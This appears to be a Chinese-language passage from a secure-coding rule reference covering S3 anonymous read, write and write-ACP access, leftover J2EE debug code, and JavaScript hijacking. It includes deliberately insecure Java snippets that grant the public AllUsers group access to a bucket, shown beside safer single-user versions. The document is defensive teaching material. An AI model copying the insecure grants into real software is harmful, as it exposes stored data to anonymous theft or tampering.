<h5 id="EXPLANATION-114"><a href="#EXPLANATION-114" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予对存储桶或对象的匿名读取访问权限将允许攻击者读取其内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名读取访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Read&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-114"><a href="#RECOMMENDATIONS-114" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的读取访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Read&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-112"><a href="#REFERENCES-112" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Write-ACP-Anonymous-Access"><a href="#Insecure-Storage-S3-Write-ACP-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Write ACP Anonymous Access"></a>Insecure Storage: S3 Write ACP Anonymous Access</h4><h5 id="ABSTRACT-114"><a href="#ABSTRACT-114" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予匿名写入 AWS S3 存储桶或对象的访问控制策略 (ACP) 的权限。</p>
<h5 id="EXPLANATION-115"><a href="#EXPLANATION-115" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予匿名写入存储桶或对象的访问控制策略 (ACP) 的权限将允许攻击者在该存储桶中读取或写入任意内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名写入 ACP 访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;WRITE_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-115"><a href="#RECOMMENDATIONS-115" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的访问控制策略 (ACP) 写入访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;WRITE_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-113"><a href="#REFERENCES-113" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Write-Anonymous-Access"><a href="#Insecure-Storage-S3-Write-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Write Anonymous Access"></a>Insecure Storage: S3 Write Anonymous Access</h4><h5 id="ABSTRACT-115"><a href="#ABSTRACT-115" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予对 AWS S3 存储桶或对象的匿名写入访问权限。</p>
<h5 id="EXPLANATION-116"><a href="#EXPLANATION-116" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予对存储桶或对象的匿名写入访问权限将允许攻击者替换内容或上传恶意内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名写入访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Write&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-116"><a href="#RECOMMENDATIONS-116" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的写入访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Write&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-114"><a href="#REFERENCES-114" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="J2EE-Bad-Practices-Leftover-Debug-Code"><a href="#J2EE-Bad-Practices-Leftover-Debug-Code" class="headerlink" title="J2EE Bad Practices: Leftover Debug Code"></a>J2EE Bad Practices: Leftover Debug Code</h4><h5 id="ABSTRACT-116"><a href="#ABSTRACT-116" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试代码可以在部署的 web 应用程序中建立一些意想不到的入口点。</p>
<h5 id="EXPLANATION-117"><a href="#EXPLANATION-117" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发过程中一般会为了调试和测试目的增加一些“后门”代码，这些代码不会随应用程序一起提供或部署。如果这类调试代码无意中被保留在应用程序中，则会导致应用程序向计划外的交互模式开放。这些后门入口点很容易产生安全隐患，因为它们不在当初的设计或者测试的考虑之内，并且不会出现在应用程序设计中的操作环境里。</p>
<p>遗忘调试代码中最常见例子出现在 web 应用程序中的 main() 方法。尽管这在产品的开发过程中是完全可以接受的，但是属于 J2EE 应用程序中的那部分类不应该定义 main()。</p>
<h5 id="RECOMMENDATIONS-117"><a href="#RECOMMENDATIONS-117" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>务必在部署应用程序的产品版之前删除调试代码。无论是否存在直接的安全威胁，一旦早期开发阶段结束，就没有任何理由将这样的代码保留在应用程序中。</p>
<h5 id="REFERENCES-115"><a href="#REFERENCES-115" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ENV06-J. Production code must not contain debugging entry points CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 489</p>
<p>[3] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<h4 id="JavaScript-Hijacking"><a href="#JavaScript-Hijacking" class="headerlink" title="JavaScript Hijacking"></a>JavaScript Hijacking</h4><h5 id="ABSTRACT-117"><a href="#ABSTRACT-117" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</p>
<h5 id="EXPLANATION-118"><a href="#EXPLANATION-118" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。</p>
<p>Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行从其他网站加载敏感信息的 JavaScript，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。</p>
<p>JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。</p>
